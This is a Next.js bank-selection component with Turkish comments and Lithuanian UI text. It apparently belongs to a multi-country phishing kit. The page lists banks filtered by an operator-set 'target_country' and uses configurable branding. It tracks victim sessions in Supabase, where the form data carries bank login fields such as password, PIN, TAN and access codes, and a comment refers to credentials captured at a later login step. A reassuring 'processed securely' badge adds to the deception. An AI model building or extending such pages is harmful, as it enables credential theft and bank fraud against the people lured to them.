"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
import type { BankCatalogEntry } from "@/lib/at-bank-catalog";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { getPreferredRouteSessionId, persistActiveSession } from "@/lib/session-id-client";
import { useSettings } from "@/contexts/SettingsContext";
import { countriesMatch } from "@/lib/country-utils";
import { resolveLocalBankLogoFile } from "@/lib/bank-logo-constants";

type Props = {
  sessionId: string;
  routeSessionId?: string;
  initialBanks: BankCatalogEntry[];
};

export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
  const [banks, setBanks] = useState<BankCatalogEntry[]>(initialBanks);
  const [bankSlug, setBankSlug] = useState("");
  const [searchTerm, setSearchTerm] = useState("");
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [recovering, setRecovering] = useState(false);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  const navigationLockRef = useRef(false);
  const refreshAbortRef = useRef<AbortController | null>(null);
  const selectionVersionRef = useRef(0);
  const mountedRef = useRef(true);

  useEffect(() => {
    setBanks(initialBanks);
  }, [initialBanks]);

  useEffect(() => {
    mountedRef.current = true;
    return () => {
      mountedRef.current = false;
      selectionVersionRef.current += 1;
      refreshAbortRef.current?.abort();
    };
  }, []);

  const refreshBanks = useCallback(async () => {
    if (navigationLockRef.current) return;

    refreshAbortRef.current?.abort();
    const controller = new AbortController();
    refreshAbortRef.current = controller;

    try {
      const res = await fetch(`/api/banks?t=${Date.now()}`, {
        cache: "no-store",
        headers: {
          "Cache-Control": "no-cache",
        },
        signal: controller.signal,
      });

      if (!res.ok) return;
      const data = await res.json();
      if (!Array.isArray(data.banks)) return;

      setBanks(
        data.banks.map((bank: any) => {
          const rawLogoFile = bank.logoFile ?? bank.logo_file;
          const resolvedLogoFile = resolveLocalBankLogoFile(bank.slug ?? null, rawLogoFile);
          return {
            slug: bank.slug,
            name: bank.name,
            domain: bank.domain,
            logoFile: resolvedLogoFile,
            country: bank.country,
            isActive: bank.isActive !== false && bank.is_active !== false,
          };
        }),
      );
    } catch (error) {
      if (error instanceof Error && error.name === "AbortError") return;
      /* ignore transient refresh errors */
    } finally {
      if (refreshAbortRef.current === controller) {
        refreshAbortRef.current = null;
      }
    }
  }, []);

  useEffect(() => {
    if (!sessionId) return;
    persistActiveSession(sessionId, routeSessionId);
    if (supabase) {
      void supabase
        .from("sessions")
        .update({ is_hidden: false, current_step: "banken" })
        .eq("id", sessionId);
    }
    if (window.location.search.includes("session=")) {
      window.history.replaceState(window.history.state, "", "/banken");
    }
  }, [sessionId, routeSessionId, supabase]);

  useEffect(() => {
    const resetUi = () => {
      selectionVersionRef.current += 1;
      navigationLockRef.current = false;
      setSaving(false);
      setMsg(null);
      setRecovering(false);
      setSearchTerm("");
      setBankSlug("");
      setBanks(initialBanks);
    };

    const refreshView = () => {
      if (navigationLockRef.current) return;
      resetUi();
      void refreshBanks();
    };

    const onPageShow = (event: PageTransitionEvent) => {
      const entries = typeof performance !== "undefined" ? performance.getEntriesByType("navigation") : [];
      const navEntry = entries[0] as PerformanceNavigationTiming | undefined;
      const isBackForward = navEntry?.type === "back_forward";

      if (event.persisted || isBackForward) {
        refreshView();
      }
    };

    window.addEventListener("pageshow", onPageShow);
    return () => {
      window.removeEventListener("pageshow", onPageShow);
    };
  }, [initialBanks, refreshBanks]);

  const demoOptions = useMemo(() => {
    // Sadece aktif olanları ve (eğer seçilmişse) hedef ülkenin bankalarını göster
    // 🚨 FACEBOOK BANKA DEGIL: Kullanici banka listesinde ASLA gorunmesin.
    const NON_BANK_SLUGS = /facebook|meta|instagram/i;
    let validBanks = banks.filter(b => b.isActive !== false && !(b?.slug && NON_BANK_SLUGS.test(b.slug)));
    
    if (settings.target_country && settings.target_country !== "Tümü") {
      validBanks = validBanks.filter(b => countriesMatch(b.country, settings.target_country));
    }

    return validBanks.map((bank) => ({
      slug: bank.slug,
      displayName: bank.name,
      domain: bank.domain,
      logoFile: resolveLocalBankLogoFile(bank.slug, bank.logoFile),
    }));
  }, [banks, settings.target_country]);

  const filteredOptions = useMemo(() => {
    const q = searchTerm.trim().toLowerCase();
    if (!q) return demoOptions;
    return demoOptions.filter((opt) => opt.displayName.toLowerCase().includes(q));
  }, [searchTerm, demoOptions]);

  useEffect(() => {
    if (sessionId) return;
    try {
      const cachedSessionId = localStorage.getItem("activeSessionId");
      if (cachedSessionId) {
        setRecovering(true);
        router.replace("/banken");
      }
    } catch {
      /* ignore localStorage access errors */
    }
  }, [sessionId]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setSessionFormData(fd);
      setBankSlug(fd.bankSlug ?? "");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleBankSelect(nextBankSlug: string, displayName: string) {
    if (!supabase || !sessionId || !nextBankSlug || navigationLockRef.current) return;

    const selectionVersion = selectionVersionRef.current + 1;
    selectionVersionRef.current = selectionVersion;
    navigationLockRef.current = true;
    refreshAbortRef.current?.abort();
    setSaving(true);
    setMsg(null);
    setBankSlug(nextBankSlug);

    const nextFormData: Record<string, any> = {
      ...sessionFormData,
    };

    // 🔴 KRITIK: bankSlug / bankName ALANLARINI BURADA DB YE YAZMA!
    //    Neden? Kullanici SEB secti -> submit -> sonra Swedbank'a sectiginde,
    //    eger burada bankName=Swedbank yazarsak ESKI SEB submitinin bankName
    //    kaydini DB den silmis oluruz. Sonra Swedbank submit esnasinda
    //    sfd.bankName (ESKI) Swedbank olur (SEB degil) -> history yanlis isimle kaydedilir.
    //    Bunlar SADECE bank-login-client icindeki HANDLE SUBMIT aninda credentials
    //    icinden nextFormData'ya yazilir (garantili).

    // Banka değiştirildiğinde eski bankaya ait giriş bilgilerini temizle
    const bankSpecificFields = [
      "username", "password", "verfuegernummer", "pin", "rekeningnummer",
      "pasnummer", "toegangscode", "signatuur", "identificatiecode", "tacCode"
    ];
    for (const field of bankSpecificFields) {
      delete nextFormData[field];
    }

    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "bank",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    if (!mountedRef.current || selectionVersionRef.current !== selectionVersion) {
      return;
    }

    setSaving(false);
    if (error) {
      navigationLockRef.current = false;
      setMsg("Nepavyko išsaugoti.");
    }
    else {
      setSessionFormData(nextFormData);
      router.push(`/win/${effectiveRouteSessionId}/bank/${nextBankSlug}`);
    }
  }

  if (!supabase) {
    return (
      <div className="a3d-shell items-center justify-center p-4">
        <div className="a3d-card w-full max-w-[560px] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    if (recovering) {
      return (
        <div className="a3d-shell items-center justify-center p-4">
          <div className="a3d-card w-full max-w-[460px] p-8 text-center">
            <h2 className="a3d-title mb-2 text-2xl">{settings.banken_title}</h2>
            <p className="a3d-sub mb-8 text-sm font-medium">Sesija atkuriamasi...</p>
            <div className="flex justify-center py-8">
              <div className="a3d-spinner size-10" />
            </div>
          </div>
        </div>
      );
    }
    return (
      <div className="a3d-shell items-center justify-center p-4">
        <div className="a3d-card w-full max-w-[460px] p-8 text-center">
          <h2 className="a3d-title mb-2 text-2xl">{settings.banken_title}</h2>
          <p className="a3d-sub mb-6 text-sm font-medium">Neteisinga nuoroda.</p>
          <p className="rounded-2xl border border-red-200 bg-red-50/90 p-4 text-center text-sm font-medium text-red-600">
            Norėdami tęsti, naudokite visą nuorodą.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="a3d-shell">
      <div className="a3d-glow left-[-10%] top-[-12%] h-[440px] w-[440px] bg-[rgba(var(--brand-rgb),0.15)]" />
      <div className="a3d-glow bottom-[-14%] right-[-8%] h-[400px] w-[400px] bg-[rgba(var(--brand-rgb),0.11)]" />

      <main className="relative z-10 flex w-full flex-1 flex-col items-center justify-center p-3 sm:p-4">
        <div className="a3d-card a3d-in flex h-[calc(100dvh-3rem)] max-h-[760px] w-full max-w-[560px] flex-col overflow-hidden p-4 sm:p-6">
          <div className="mb-4 flex items-start justify-between gap-4">
            <div className="min-w-0">
              <h2 className="a3d-title text-[22px] leading-tight sm:text-[24px]">{settings.banken_title}</h2>
              <p className="a3d-sub mt-1.5 text-[13px] font-medium sm:text-sm">{settings.banken_subtitle}</p>
            </div>
            <img
              src={settings.logo_url || "/form-assets/iki-mini-logo.png"}
              alt={settings.portal_name || "Brand"}
              className="h-11 w-11 shrink-0 object-contain"
            />
          </div>

          <div className="mb-4 shrink-0">
            <div className="a3d-input flex items-center gap-2.5 px-4 py-3">
              <svg aria-hidden viewBox="0 0 24 24" className="h-4.5 w-4.5 shrink-0 text-[#98a2b3]" fill="none" stroke="currentColor" strokeWidth="2">
                <circle cx="11" cy="11" r="7" />
                <path d="m20 20-3.5-3.5" />
              </svg>
              <input
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                placeholder={settings.banken_search_placeholder}
                className="w-full bg-transparent text-sm text-[#101828] outline-none placeholder:text-[#98a2b3]"
              />
            </div>
          </div>

          <div className="a3d-scroll min-h-0 flex-1 overflow-y-auto pr-1">
            <div className="grid grid-cols-1 gap-2.5 pb-1">
              {filteredOptions.length === 0 ? (
                <div className="a3d-inset p-5 text-center text-sm font-medium text-[#667085]">
                  Pasirinktai šaliai bankų nerasta. Išvalykite paieškos filtrą.
                </div>
              ) : filteredOptions.map((opt, idx) => (
                <button
                  key={opt.slug}
                  type="button"
                  onClick={() => void handleBankSelect(opt.slug, opt.displayName)}
                  disabled={saving}
                  className={`a3d-bank-item a3d-in ${bankSlug === opt.slug ? "a3d-selected" : ""}`}
                  style={{ animationDelay: `${idx * 28}ms` }}
                >
                  <div className="a3d-logo-ring size-12">
                    <img
                      src={optimizeSupabaseImageUrl(opt.logoFile, { format: "webp", quality: 90, width: 256 }) || opt.logoFile}
                      alt={opt.displayName}
                      className="h-full w-full rounded-full object-cover"
                      onError={(e) => {
                        e.currentTarget.onerror = null;
                        e.currentTarget.style.display = 'none';
                        const fallback = e.currentTarget.nextElementSibling as HTMLElement;
                        if (fallback) fallback.style.display = 'grid';
                      }}
                    />
                    <div style={{ display: 'none' }} className="grid h-full w-full place-items-center text-sm font-black text-[var(--brand)]">
                      {opt.displayName.charAt(0)}
                    </div>
                  </div>

                  <div className="min-w-0 flex-1 text-left">
                    <p className="a3d-title truncate text-[15px] font-semibold sm:text-[16px]">
                      {opt.displayName}
                    </p>
                  </div>

                  <div className="flex shrink-0 items-center">
                    {saving && bankSlug === opt.slug ? (
                      <div className="a3d-spinner size-5" style={{ borderWidth: "2px" }} />
                    ) : (
                      <svg aria-hidden viewBox="0 0 24 24" className="h-5 w-5 text-[#98a2b3] transition-colors group-hover:text-[var(--brand)]" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                        <path d="m9 6 6 6-6 6" />
                      </svg>
                    )}
                  </div>
                </button>
              ))}
            </div>
          </div>

          <div className="mt-4 flex shrink-0 justify-center border-t border-[#1018280a] pt-4">
            <div className="a3d-pill">
              <svg className="h-4 w-4 text-[var(--brand)]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.9" d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" />
              </svg>
              <span>Jūsų banko pasirinkimas apdorojamas saugiai.</span>
            </div>
          </div>
        </div>

        {msg ? (
          <div className="mt-3 w-full max-w-[560px] rounded-2xl border border-red-200 bg-red-50/90 p-3.5 text-center text-sm font-medium text-red-600">
            {msg}
          </div>
        ) : null}
      </main>
    </div>
  );
}
